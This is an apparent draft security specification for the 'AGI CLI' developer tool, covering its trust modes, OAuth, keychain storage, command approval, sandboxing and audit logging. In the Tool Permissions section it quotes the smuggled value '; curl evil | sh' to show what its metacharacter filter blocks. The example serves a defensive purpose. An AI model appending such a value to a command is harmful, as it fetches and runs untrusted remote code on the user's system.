# AGI CLI — Volume 16 — Security

Status: Draft spec
Owner: Founder + platform lead
Last updated: 2026-07-01

Authority: `AGENTS.md` (root) and `apps/cli/AGENTS.md`; `docs/current/source-of-truth.md`; `docs/products/README.md` (canon); grounded in `apps/cli/src/agent/mod.rs`, `apps/cli/src/auth.rs`, `apps/cli/src/oauth.rs`, `apps/cli/src/auth_oauth.rs`, `apps/cli/src/mcp/oauth_store.rs`, `apps/cli/src/cloud.rs`, `apps/cli/src/permissions.rs`, `apps/cli/src/exec_policy.rs`, `apps/cli/src/tool_filters.rs`, `apps/cli/src/path_security.rs`, `apps/cli/src/sandbox.rs`, `apps/cli/src/project_registry.rs`, `apps/cli/src/approval_audit.rs`, `crates/agiworkforce-app-server/src/lib.rs`, `apps/cli/Cargo.toml`.

## Overview & stance

AGI CLI is the pure-Rust (Ratatui TUI) developer surface, and security here means keeping the three trust modes — Local, BYOK, Managed — genuinely separate on a workstation that already runs a shell, edits files, and talks to model providers. Sessions are workspace/session-scoped: nothing syncs to app chat automatically; any handoff is explicit and redacted. The load-bearing invariant is that a Local session never silently reaches a non-local provider — enforced in `apps/cli/src/agent/mod.rs` by `PrivacyMode` and `validate_privacy_boundary`, and by an armed, consent-gated `Local→BYOK` handoff (`arm_byok_handoff`/`consume_byok_handoff`). Command examples use the `agi` binary; `agiworkforce` is only a compatibility alias (both declared in `apps/cli/Cargo.toml`).

## Authentication

✅ Built — `apps/cli/src/auth.rs` defines `AuthStore`/`AuthEntry` (`OAuth { refresh, access, expires, account_id }` or `ApiKey { key }`) persisted to `auth.json` under the CLI config dir. `agi login [provider]` (`Command::Login` in `apps/cli/src/lib.rs`) authenticates AGI cloud or an LLM provider; `agi logout` and an auth-status command report state. Managed tier also honors the `AGIWORKFORCE_JWT` env token. Requirement: every credential path must classify the trust mode before use and fail closed on unknown hosted model IDs (`AgentSession::new_checked`). 🔭 Planned: Clerk-backed device-code login unifying the CLI with the account model used by Web/Mobile.

## Secret Storage — OS keychains

✅ Built — `apps/cli/src/mcp/oauth_store.rs` uses the `keyring` crate (`apps/cli/Cargo.toml`, `keyring = "2"`) under service `agiworkforce-mcp-oauth`: OS keyring first (macOS Keychain, Windows Credential Manager, Linux libsecret/DBus), with a file fallback when the keyring is unavailable. `AGIWORKFORCE_NO_KEYRING` opts out for CI/headless/containers. 🟡 Partial — the primary `auth.json` store (`apps/cli/src/auth.rs`) is protected by Unix `0o600` file permissions (`set_file_permissions`) and a `permissions_secure` check, but is not itself moved into the OS keychain; on Windows/macOS the 0o600 hardening does not apply, so keychain-backing the main store is the tracked gap. Requirement: no secret is ever written world-readable and no secret value appears in logs.

## OAuth

✅ Built — `apps/cli/src/oauth.rs` and `apps/cli/src/auth_oauth.rs` implement browser-based PKCE: a 64-byte random `code_verifier`, `code_challenge = base64url(sha256(verifier))`, a CSRF `state` nonce, and a one-shot loopback listener on `127.0.0.1`. State validation is mandatory — for providers that echo state appended to the code (`echoes_state_in_code`), the fragment is required and checked, never silently skipped. Provider endpoints/client IDs are declared in-source (Anthropic, OpenAI, Copilot). Requirement: token exchange must reject mismatched/absent state; refresh failures are typed (`RefreshError::InvalidGrant/NetworkError/ServerError`) so expired grants prompt re-auth rather than silent downgrade.

## API Keys

✅ Built — BYOK provider keys are read from environment (`apps/cli/src/cloud.rs`: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GOOGLE_API_KEY`, `DEEPSEEK_API_KEY`, `MISTRAL_API_KEY`, `XAI_API_KEY`) or stored as `AuthEntry::ApiKey`. The `BYOK config` `Debug` impl in `cloud.rs` redacts key values. Requirement: BYOK is available only on Desktop/CLI/VS Code — never Web/Mobile — and a Local session must fork explicitly (context selection, secret scan, payload preview, visible provider label, consent) before any key is used; `validate_privacy_boundary` blocks the Local→provider leak until consent fires. Never invent model IDs — resolve from `packages/contracts/types/src/models.json`.

## Tool Permissions

✅ Built — `apps/cli/src/permissions.rs` holds `PermissionRule` matching with token-prefix logic that rejects shell metacharacters (`;`, `&&`, `|`, `$(...)`, backticks) so an allowed prefix like `git status` cannot smuggle `; curl evil | sh`, plus a process-session allowlist. `apps/cli/src/tool_filters.rs` and `AgentSession::apply_tool_filters` enforce `--allowed-tools`/`--disallowed-tools`; MCP tools are namespaced and filterable. Requirement: allow-rules are least-privilege and per-workspace by default.

## Command Approval

✅ Built — `apps/cli/src/exec_policy.rs` evaluates `PolicyRule`s with `PolicyEffect::Allow`/`Deny` where **Deny always wins**, using `Prefix`/`Regex`/`Heuristic`/`Program` matchers; the TUI approval broker (`apps/cli/src/tui/approval_broker.rs`) surfaces prompts. `--dangerously-skip-permissions` (`apps/cli/src/cli_options.rs`) is the only bypass and must be explicit. Requirement: mutating tools stay blocked in plan mode until the plan is approved (`AgentSession::handle_update_plan`).

## Workspace Trust

✅ Built — `apps/cli/src/project_registry.rs` records per-project trust (`ALLOWED_TRUST_LEVELS = ["trusted","untrusted","ask"]`, validated on `register_project`) resolved via `apps/cli/src/project_scope.rs`. Requirement: an untrusted or unseen workspace defaults to `ask`; auto-run of workspace-supplied hooks/skills/MCP config requires trust.

## Filesystem Permissions

✅ Built — `apps/cli/src/path_security.rs` canonicalizes and validates every path against registered workspace roots (`validate_workspace_path`), and `/add-dir` extends roots only through `register_additional_workspace_root` (must exist, must be a directory, canonicalized). Attachments are size-capped (`attach_context_files`). Requirement: no tool reads or writes outside a registered root; symlink escapes fail closed via canonicalization.

## Network Permissions

✅ Built — `apps/cli/src/sandbox.rs` defaults `NetworkPolicy::Deny`; outbound access (npm, git, curl) must be granted explicitly, and `SandboxType::detect` selects macOS Seatbelt / Linux Bubblewrap / Landlock / Windows restricted token where available. The remote-control/companion host (`crates/agiworkforce-app-server/src/lib.rs`) requires a non-empty auth token, enforces an Origin allowlist (loopback defaults; missing Origin rejected when an allowlist is set), binds loopback, and disables `?token=` query auth by default. 🔭 Planned: phone/web Remote Control over a locally-running CLI session (QR + HMAC pairing, outbound-only, approval-gated), mirroring Claude Code Remote Control and Codex remote connections — a secure window, not a fourth trust mode.

## Audit Logs

✅ Built — `apps/cli/src/approval_audit.rs` appends `approvals.jsonl` (CLI config dir) with `ApprovalAuditEntry { timestamp (RFC3339), tool_name, target, decision (Approved/Denied/BlockedByRule), risk, reason, cwd }`; fields are sanitized and capped (`MAX_FIELD_CHARS = 1_000`). Requirement: every approval decision is recorded append-only with no secret values. 🔭 Planned: privacy-mode transition and BYOK-handoff consent events written to the same audit stream, plus `agi` surfacing to review the log.

## Repository map

- `apps/cli/src/agent/mod.rs` — `PrivacyMode`, boundary enforcement, BYOK handoff.
- `apps/cli/src/auth.rs`, `apps/cli/src/oauth.rs`, `apps/cli/src/auth_oauth.rs` — auth store, PKCE OAuth.
- `apps/cli/src/mcp/oauth_store.rs` — OS-keychain-backed MCP token store.
- `apps/cli/src/cloud.rs` — BYOK env keys, redacted debug.
- `apps/cli/src/permissions.rs`, `apps/cli/src/exec_policy.rs`, `apps/cli/src/tool_filters.rs` — tool/command approval.
- `apps/cli/src/path_security.rs`, `apps/cli/src/project_registry.rs`, `apps/cli/src/sandbox.rs` — filesystem/workspace/network.
- `apps/cli/src/approval_audit.rs` — audit log.
- `crates/agiworkforce-app-server/src/lib.rs` — token + origin auth for the WS host.

## Competitor notes

Claude Code and Codex CLI both do PKCE OAuth, OS-keychain token storage, per-command approval, and sandboxed execution; Claude Code adds Remote Control (research preview) that keeps compute on the host. AGI's deliberate divergence: multi-provider by design, BYOK as a first-class free access mode where the surface allows it (Desktop/CLI/VS Code only), an explicit per-surface trust matrix, and a hard Local-first boundary — a Local session is cryptographically and structurally prevented from reaching cloud/BYOK without a consented, previewed fork. No competitor separates Local/BYOK/Managed as three enforced trust modes on one CLI.

## Acceptance / Definition of Done

Production-ready when a Local session provably cannot leak to a non-local provider, all secrets live in the OS keychain or 0o600 files, OAuth state is always validated, command/tool approvals are least-privilege with Deny-precedence, and every approval and trust-transition is auditable.

- [ ] Build: `cargo test -p agiworkforce-cli --lib` green, including the privacy-boundary and BYOK-handoff tests in `apps/cli/src/agent/mod.rs`.
- [ ] Trust: Local→BYOK/Managed requires context selection, secret scan, payload preview, visible provider label, and consent; no silent route.
- [ ] Security: no secret values in `approvals.jsonl` or logs; app-server rejects missing token and cross-origin; sandbox network defaults to Deny.

## Anti-patterns

- Silently routing Local chats/files/sessions to BYOK or Managed Cloud, or treating drafting as consent.
- Storing keys world-readable, echoing key values in logs/`Debug`, or skipping OS-keychain backing where available.
- Skipping OAuth `state`/PKCE validation, or accepting a code without the required echoed state.
- Weakening Deny-precedence, widening filesystem/network scope, or shipping `--dangerously-skip-permissions` as a default.
- Reintroducing the stale "cloud execution is private beta" gate as a hard block (`apps/cli/src/cloud.rs`) — Managed Cloud is public alpha, open by default (🟡 reconcile).
- Hardcoding or inventing model IDs (use `packages/contracts/types/src/models.json`), referencing removed tiers ("Plus"/`pro_plus`/"Hobby"), inventing INR prices, or referencing Supabase.
